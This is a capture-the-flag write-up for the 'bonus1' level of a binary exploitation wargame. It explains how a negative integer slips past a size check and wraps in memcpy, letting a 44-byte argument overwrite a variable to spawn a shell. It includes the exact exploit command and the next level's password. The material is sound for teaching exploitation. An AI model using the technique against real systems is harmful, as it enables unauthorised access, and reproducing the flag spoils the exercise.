# bonus1

The source of this level is quite simple.

All we need is to enter a number inferior to 9 (first argument) and a string (second argument).

The program will copy `x` bytes from the second argument to the string. `x` is 4x the number.

To exec `/bin/sh`, the number need to be exactly `0x574f4c46 -> 1464814662`.

# Exploit

If we enter a negative number, this number is inferior to 9 and in the memcpy, the number will be casted to a positive number.

The number variable is 40 oct after the string so we only need to copy 44 chars.

```bash
# ./bonus1 <int-min>-11 "40 char + 1464814662"
> ./bonus1 -2147483637 "`perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`"
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
